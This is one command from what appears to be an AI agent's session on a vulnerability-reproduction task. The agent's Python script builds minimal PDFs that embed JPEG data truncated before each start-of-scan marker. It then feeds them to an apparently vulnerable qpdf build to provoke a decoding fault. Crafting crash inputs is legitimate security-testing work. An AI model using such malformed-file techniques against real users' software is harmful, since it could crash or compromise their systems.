message:
Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
jpg=Path('/workspace/pocs/img_im.jpg').read_bytes()
pos=[i for i in range(len(jpg)-1) if jpg[i]==0xff and jpg[i+1]==0xda]
def make(data,out):
    pdf=bytearray(b'%PDF-1.3\n%\xe2\xe3\xcf\xd3\n'); offs=[]
    def obj(n,s):
        offs.append(len(pdf)); pdf.extend(f'{n} 0 obj\n'.encode()+s+b'\nendobj\n')
    obj(1,b'<< /Type /Catalog /Pages 2 0 R >>')
    obj(2,b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>')
    obj(3,b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 8 24] /Resources << /XObject << /Im0 4 0 R >> >> /Contents 5 0 R >>')
    obj(4,f'<< /Type /XObject /Subtype /Image /Width 8 /Height 24 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /DCTDecode /Length {len(data)} >>'.encode()+b'\nstream\n'+data+b'\nendstream')
    content=b'q 8 0 0 24 0 0 cm /Im0 Do Q\n'
    obj(5,f'<< /Length {len(content)} >>'.encode()+b'\nstream\n'+content+b'endstream')
    x=len(pdf); pdf.extend(f'xref\n0 6\n0000000000 65535 f \n'.encode())
    for o in offs: pdf.extend(f'{o:010d} 00000 n \n'.encode())
    pdf.extend(f'trailer << /Root 1 0 R /Size 6 >>\nstartxref\n{x}\n%%EOF\n'.encode())
    Path(out).write_bytes(pdf)
for n in range(1,len(pos)):
    data=jpg[:pos[n]]+b'\xff\xd9'
    make(data,f'/workspace/pocs/cut_before_sos{n}.pdf')
print(pos)
PY
for f in /workspace/pocs/cut_before_sos1.pdf /workspace/pocs/cut_before_sos2.pdf /workspace/pocs/cut_before_sos3.pdf; do echo RUN:$f; JSIMD_FORCENONE=1 /workspace/repo-vul/work-vul/bin/qpdf --decode-level=all --qdf "$f" /workspace/pocs/out.pdf >/tmp/qout 2>&1; echo exit:$?; head -25 /tmp/qout; done
